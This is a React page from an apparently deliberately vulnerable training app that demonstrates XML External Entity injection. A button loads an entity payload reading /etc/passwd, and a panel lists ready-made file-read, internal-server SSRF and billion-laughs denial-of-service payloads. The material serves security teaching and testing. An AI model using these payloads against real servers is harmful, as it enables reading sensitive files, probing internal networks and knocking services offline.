'use client';

import { useState } from 'react';
import Link from 'next/link';

export default function XXEPage() {
  const [xmlInput, setXmlInput] = useState(`<?xml version="1.0"?>
<user>
  <name>John Doe</name>
  <email>john@example.com</email>
</user>`);
  const [result, setResult] = useState('');

  const handleParse = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const response = await fetch('/api/xxe/parse', {
        method: 'POST',
        headers: { 'Content-Type': 'application/xml' },
        body: xmlInput,
      });
      const data = await response.json();
      setResult(JSON.stringify(data, null, 2));
    } catch (err) {
      setResult('Error: ' + err);
    }
  };

  const loadMaliciousPayload = () => {
    setXmlInput(`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
  <email>test@example.com</email>
</user>`);
  };

  return (
    <div style={{ padding: '2rem', maxWidth: '800px', margin: '0 auto' }}>
      <Link href="/" style={{ color: '#2563eb', marginBottom: '1rem', display: 'inline-block' }}>← Back to Home</Link>

      <h1 style={{ color: '#dc2626' }}>XXE (XML External Entity) Injection</h1>

      <div style={{ backgroundColor: '#fef3c7', padding: '1rem', borderRadius: '8px', marginBottom: '2rem' }}>
        <strong>Test payloads:</strong>
        <button
          onClick={loadMaliciousPayload}
          style={{
            marginTop: '0.5rem',
            backgroundColor: '#2563eb',
            color: 'white',
            padding: '0.25rem 0.75rem',
            border: 'none',
            borderRadius: '4px',
            cursor: 'pointer',
            fontSize: '0.875rem'
          }}
        >
          Load XXE Payload
        </button>
        <p style={{ fontSize: '0.875rem', marginTop: '0.5rem', marginBottom: 0 }}>
          The payload attempts to read <code>/etc/passwd</code> file
        </p>
      </div>

      <form onSubmit={handleParse} style={{ marginBottom: '2rem', border: '1px solid #ddd', padding: '1.5rem', borderRadius: '8px' }}>
        <h3 style={{ marginTop: 0 }}>XML Parser</h3>
        <div style={{ marginBottom: '1rem' }}>
          <label htmlFor="xml" style={{ display: 'block', marginBottom: '0.5rem', fontWeight: 'bold' }}>
            XML Input:
          </label>
          <textarea
            id="xml"
            value={xmlInput}
            onChange={(e) => setXmlInput(e.target.value)}
            rows={12}
            style={{
              width: '100%',
              padding: '0.5rem',
              border: '1px solid #ddd',
              borderRadius: '4px',
              fontSize: '0.875rem',
              fontFamily: 'monospace'
            }}
          />
        </div>
        <button
          type="submit"
          style={{
            backgroundColor: '#2563eb',
            color: 'white',
            padding: '0.5rem 1rem',
            border: 'none',
            borderRadius: '4px',
            cursor: 'pointer',
            fontSize: '1rem'
          }}
        >
          Parse XML
        </button>
      </form>

      {result && (
        <div style={{ border: '1px solid #ddd', padding: '1rem', borderRadius: '8px', backgroundColor: '#f0fdf4' }}>
          <h3>Parse Result:</h3>
          <pre style={{ backgroundColor: '#fff', padding: '1rem', borderRadius: '4px', overflow: 'auto', whiteSpace: 'pre-wrap' }}>
            {result}
          </pre>
        </div>
      )}

      <div style={{ marginTop: '2rem', padding: '1rem', backgroundColor: '#fee2e2', borderRadius: '8px' }}>
        <h3 style={{ marginTop: 0 }}>Vulnerability Details:</h3>
        <p><strong>Type:</strong> XXE (XML External Entity) Injection</p>
        <p><strong>Risk:</strong> XML parser processes external entities without proper configuration.</p>
        <p><strong>Impact:</strong></p>
        <ul>
          <li>Read local files from the server</li>
          <li>Server-Side Request Forgery (SSRF)</li>
          <li>Denial of Service (billion laughs attack)</li>
          <li>Remote code execution (in some cases)</li>
        </ul>
        <p><strong>Common Payloads:</strong></p>
        <pre style={{ backgroundColor: '#fff', padding: '0.5rem', borderRadius: '4px', fontSize: '0.75rem' }}>
{`<!-- Read file -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<!-- SSRF -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/">]>

<!-- DoS (Billion Laughs) -->
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>`}
        </pre>
      </div>
    </div>
  );
}
